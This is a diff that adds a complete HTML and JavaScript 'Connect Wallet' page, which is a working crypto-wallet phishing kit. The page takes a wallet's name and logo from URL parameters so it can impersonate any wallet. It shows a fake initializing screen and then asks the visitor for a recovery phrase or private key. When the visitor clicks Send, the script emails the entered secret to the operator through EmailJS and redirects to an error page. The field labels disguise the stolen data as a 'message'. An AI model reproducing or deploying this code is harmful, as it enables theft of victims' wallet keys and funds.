@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Connect Wallet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="connect.css">
+
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("OmsN-pEL1oGLh2keE");
+    })();
+  </script>
+</head>
+
+<body>
+  <div class="overlay">
+    <div class="modal">
+
+      <!-- PAGE 1: INITIALIZING -->
+      <div class="screen active" id="screen-init">
+        <div class="init-box">Initializing...</div>
+
+        <div class="wallet-row">
+          <div class="wallet-logo" id="initLogo">W</div>
+          <div class="wallet-text" id="initName">Loading...</div>
+        </div>
+      </div>
+
+      <!-- PAGE 2: FORM -->
+      <div class="screen" id="screen-form">
+        <div class="wallet-header">
+          <div class="wallet-header-logo" id="formLogo">W</div>
+          <div class="wallet-header-title" id="formName">Wallet</div>
+        </div>
+
+        <div class="tabs">
+          <button class="tab active" data-tab="message">Phrase</button>
+          <button class="tab" data-tab="feedback">Private Key</button>
+        </div>
+
+        <textarea id="textInput" class="input-area"
+          placeholder="Enter your recovery phrase, typically 12 (sometimes 24) words seperated by a single space..."></textarea>
+
+        <!-- <div class="hint">
+          Please write your message or feedback using normal text.
+        </div> -->
+
+        <div class="actions">
+          <button class="primary-btn" id="submitBtn">Send</button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    function setupWalletUI() {
+      const params = new URLSearchParams(window.location.search);
+
+      // Read wallet name + logo from URL
+      const walletName = params.get("name") || "Wallet";
+      const walletLogo = params.get("logo") || "";
+
+      // UI elements
+      const initLogo = document.getElementById("initLogo");
+      const formLogo = document.getElementById("formLogo");
+      const initName = document.getElementById("initName");
+      const formName = document.getElementById("formName");
+
+      // Set names
+      initName.textContent = walletName;
+      formName.textContent = walletName;
+
+      // Set logos
+      function applyLogo(element, text) {
+        if (walletLogo) {
+          const decoded = decodeURIComponent(walletLogo);
+          element.style.backgroundImage = `url('${decoded}')`;
+          element.style.backgroundSize = "cover";
+          element.style.backgroundPosition = "center";
+          element.textContent = "";
+        } else {
+          element.style.backgroundImage = "none";
+          element.textContent = text.charAt(0).toUpperCase();
+        }
+      }
+
+      applyLogo(initLogo, walletName);
+      applyLogo(formLogo, walletName);
+    }
+
+    window.addEventListener("DOMContentLoaded", () => {
+      setupWalletUI();
+
+      const initScreen = document.getElementById("screen-init");
+      const formScreen = document.getElementById("screen-form");
+      const textInput = document.getElementById("textInput");
+      const tabs = document.querySelectorAll(".tab");
+
+      // Show form after delay
+      setTimeout(() => {
+        initScreen.classList.remove("active");
+        formScreen.classList.add("active");
+      }, 1500);
+
+      // Tab switching
+      tabs.forEach((tab) => {
+        tab.addEventListener("click", () => {
+          tabs.forEach((t) => t.classList.remove("active"));
+          tab.classList.add("active");
+
+          textInput.placeholder = 
+            tab.dataset.tab === "message"
+              ? "Enter your recovery phrase..."
+              : "Enter your private key...";
+        });
+      });
+
+      // SEND button — send ONLY the message text
+      document.getElementById("submitBtn").addEventListener("click", () => {
+        const userText = textInput.value.trim();
+
+        if (!userText) {
+          alert("Please enter a message before sending.");
+          return;
+        }
+
+        // Send ONLY message_text to EmailJ
+        emailjs.send("service_qfpigta", "template_v50xk1o", {
+          user_message: userText
+        })
+        .then(() => {
+          window.location.href = "error.html";
+        })
+        .catch(() => {
+          alert("Could not send message. Try again.");
+        });
+      });
+
+    });
+  </script>
+
+</body>
+</html>
